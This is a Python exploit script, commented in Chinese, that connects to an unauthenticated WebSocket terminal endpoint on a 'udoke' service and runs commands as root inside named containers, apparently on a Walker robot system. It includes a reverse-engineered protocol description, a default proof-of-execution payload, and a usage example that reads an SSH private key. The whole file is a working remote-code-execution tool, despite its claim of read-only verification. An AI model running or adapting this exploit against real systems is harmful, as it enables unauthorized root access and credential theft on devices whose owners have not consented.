#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
udoke 未授权终端 WebSocket -> 容器内 root RCE 驱动脚本
========================================================
利用点: vision :9001 (udoke slave) 的 /ws/slave/terminal/{container} 无任何 HTTP 层鉴权。
协议(从前端 ud_chunk_index-6cb99b32.js 逆向):
  onopen   ->  send("/connect {shell} {user} 100 100")
  onopen   ->  send("/resize {rows} {cols}")
  输入     ->  send("/userinput " + base64(输入))          # 输入必须 base64
  输出     ->  二进制帧 = 终端输出;  文本帧 = JSON 状态 {"code":0,"msg":"..."}

用法:
  python udoke_ws_terminal.py <host:port> <container>
  python udoke_ws_terminal.py 192.168.11.3:9001 walker-ros.ros2-1
  python udoke_ws_terminal.py 192.168.11.3:9001 walker-system.sys_map_http_manager-1 --command 'cat /home/ubt/.ssh/id_rsa'

  --cmd     容器内启动的 shell 程序(默认 /bin/sh)。若传的不是以 / 开头的路径且含空格/; 等,
            自动按"要执行的命令"处理, 内部用 /bin/sh 承载。
  --command 要在容器内执行的命令(逐行送 base64)。

安全红线: 只读/无害验证, 不触碰运动控制 topic。
"""
import argparse
import base64
import sys
import time
import websocket

DRAIN = 2.0


def drain(ws, secs=DRAIN):
    """收满 secs 秒内的全部帧; 二进制帧按 utf-8 解码为终端输出。"""
    out = []
    end = time.time() + secs
    while time.time() < end:
        try:
            ws.settimeout(max(0.2, end - time.time()))
            f = ws.recv()
            if isinstance(f, bytes):
                out.append(("bin", f.decode(errors="replace")))
            else:
                out.append(("txt", f))
        except Exception:
            break
    return out


def safe_send(ws, msg):
    try:
        ws.send(msg)
        return True
    except Exception as ex:
        print(f"  [!] 发送失败(socket 可能已关闭): {ex}")
        return False


def normalize_cmd(cmd):
    """若 --cmd 传的不是 shell 而是命令(如 'id; hostname'), 自动转成命令执行。"""
    if cmd.startswith("/"):
        return cmd, None
    if any(ch in cmd for ch in (" ", ";", "&", "|", ">", "<", "$", "`", "\n")):
        return "/bin/sh", cmd          # 当成要执行的命令
    return cmd, None                    # 单字符程序名(如 sh/bash)按 shell 处理


def run(hostport, container, shell="/bin/sh", user="root", command=None, connect_timeout=3.0):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    shell, auto_cmd = normalize_cmd(shell)
    if command is None:
        command = auto_cmd
    if command is None:
        command = "id; hostname; uname -a; echo PWN3_RCE_WS"

    url = f"ws://{hostport}/ws/slave/terminal/{container}"
    print(f"[*] 连接 {url}")
    print(f"[*] /connect {shell} {user} 100 100")
    try:
        ws = websocket.create_connection(url, timeout=connect_timeout)
    except Exception as ex:
        print(f"[x] 连接失败: {ex}")
        return 1

    safe_send(ws, f"/connect {shell} {user} 100 100")
    safe_send(ws, "/resize 60 160")
    time.sleep(0.5)
    boot = drain(ws, 0.8)
    for kind, text in boot:
        if text.strip():
            print(f"[{kind}] {text[:160]!r}")

    print(f"[*] 执行命令: {command!r}")
    for line in command.splitlines():
        safe_send(ws, "/userinput " + base64.b64encode((line + "\n").encode()).decode())
        time.sleep(0.25)
    out = drain(ws, 2.5)
    print("[*] ---- 输出 ----")
    for kind, text in out:
        sys.stdout.write(text)
    if out:
        print()

    safe_send(ws, "/userinput " + base64.b64encode(b"exit\n").decode())
    time.sleep(0.2)
    try:
        ws.close()
    except Exception:
        pass
    print("[*] 完成")
    return 0


if __name__ == "__main__":
    ap = argparse.ArgumentParser(
        description="udoke 未授权终端 WS -> 容器内命令执行 (只读验证)。"
                    "--cmd 是 shell 程序; 要跑命令请用 --command。")
    ap.add_argument("hostport", help="udoke 端点, 如 192.168.11.3:9001")
    ap.add_argument("container", help="容器名, 如 walker-ros.ros2-1")
    ap.add_argument("--cmd", default="/bin/sh",
                    help="容器内启动的 shell 程序(默认 /bin/sh); 也可直接传命令字符串自动识别")
    ap.add_argument("--user", default="root", help="容器内以哪个用户执行(默认 root)")
    ap.add_argument("--command", default=None,
                    help="要执行的命令; 省略则跑 id; hostname; uname -a; echo PWN3_RCE_WS")
    args = ap.parse_args()
    sys.exit(run(args.hostport, args.container, shell=args.cmd,
                 user=args.user, command=args.command))
